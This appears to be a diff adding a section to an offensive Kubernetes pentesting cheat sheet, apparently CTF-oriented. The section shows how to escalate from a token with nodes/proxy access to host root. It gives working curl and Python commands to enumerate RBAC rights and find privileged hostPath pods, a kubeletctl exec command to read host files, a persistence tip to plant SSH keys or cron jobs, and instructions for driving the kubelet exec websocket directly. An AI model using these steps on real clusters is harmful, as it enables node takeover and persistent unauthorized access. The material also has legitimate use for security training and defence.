@@ -2743,6 +2743,41 @@ kubeletctl exec "id" --server <TARGET> -p <POD> -c <CONTAINER>
 kubeletctl scan rce --cidr <TARGET>/24
 ```
 
+### `nodes/proxy` RBAC → privileged pod → host root
+
+When a bound service-account token lacks direct pod `exec` but holds `get` on `nodes/proxy`, you can still reach the kubelet on every node *through the API server proxy* (or hit `:10250` directly) and exec into any pod on that node — no separate kubelet auth. Chain it with a privileged pod that bind-mounts the host root to own the node.
+
+```bash
+# Enumerate the token's effective rights — hunting for nodes/proxy (get)
+curl -sk -X POST "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
+  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
+  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}' \
+  | python3 -c "import sys,json; [print(r) for r in json.load(sys.stdin)['status'].get('resourceRules',[])]"
+# gold: {'verbs':['get'],'apiGroups':[''],'resources':['nodes/proxy']}
+```
+
+```bash
+# Find a privileged pod that mounts a hostPath (/ is the jackpot)
+curl -sk "https://<NODE_IP>:10250/pods" -H "Authorization: Bearer $TOKEN" \
+  | python3 -c "
+import sys,json
+for it in json.load(sys.stdin)['items']:
+    ns,name=it['metadata']['namespace'],it['metadata']['name']
+    vols=[v for v in it['spec'].get('volumes',[]) if 'hostPath' in v]
+    for c in it['spec']['containers']:
+        if c.get('securityContext',{}).get('privileged') and vols:
+            print(ns,name,c['name'],[v['hostPath']['path'] for v in vols])
+"
+# node-exporter / monitoring pods are frequent hits (mount /proc /sys /)
+```
+
+```bash
+# Exec in that pod via the kubelet; the host root FS is mounted inside it (e.g. /host/root)
+kubeletctl exec "cat /host/root/root.txt" --server <NODE_IP> -p <POD> -c <CONTAINER> -t $TOKEN
+# persistence: drop an SSH key or cron into /host/root/root/.ssh instead of just reading flags
+```
+No `kubeletctl`? Drive the kubelet `exec` websocket directly: `wss://<NODE>:10250/exec/<ns>/<pod>/<container>?command=<arg>&command=<arg>&output=1&error=1`, subprotocol `v4.channel.k8s.io`, `Authorization: Bearer $TOKEN`; strip the leading stream-channel byte from each frame. A ~30-line `websockets` script covers it.
+
 ### etcd (port 2379)
 
 ```bash
